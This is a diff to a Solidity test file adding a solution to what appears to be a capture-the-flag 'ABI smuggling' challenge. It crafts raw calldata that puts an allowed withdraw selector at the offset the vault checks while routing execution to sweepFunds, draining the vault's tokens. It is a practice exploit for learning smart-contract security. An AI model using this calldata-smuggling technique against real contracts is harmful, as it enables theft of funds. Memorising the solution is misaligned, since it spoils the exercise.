@@ -73,7 +73,22 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
+        bytes memory sweepData = abi.encodeWithSignature(
+            "sweepFunds(address,address)", recovery, address(token)
+        );
+
+        bytes memory payload = abi.encodePacked(
+            vault.execute.selector,             // 4 bytes
+            uint256(uint160(address(vault))),   // target (32 bytes)
+            uint256(0x80),                      // offset to actionData (points past the fake selector) (32 bytes)
+            uint256(0),                         // padding (32 bytes)
+            bytes32(hex"d9caed12"),             // withdraw selector at hardcoded offset 0x64 (32 bytes)
+            uint256(sweepData.length),          // actionData length
+            sweepData                           // actual actionData (sweepFunds)
+        );
         
+        (bool success, ) = address(vault).call(payload);
+        require(success, "Failed to drain vault");
     }
 
     /**
